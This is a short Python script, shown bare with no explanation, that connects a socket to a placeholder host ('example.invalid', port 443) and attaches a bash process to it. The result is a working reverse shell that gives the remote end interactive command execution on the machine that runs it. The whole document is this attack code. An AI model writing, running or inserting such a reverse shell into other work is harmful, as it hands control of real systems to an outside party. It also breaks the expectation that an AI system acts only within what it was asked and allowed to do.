import socket, subprocess
s = socket.socket()
s.connect(('example.invalid', 443))
subprocess.Popen(['bash'], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
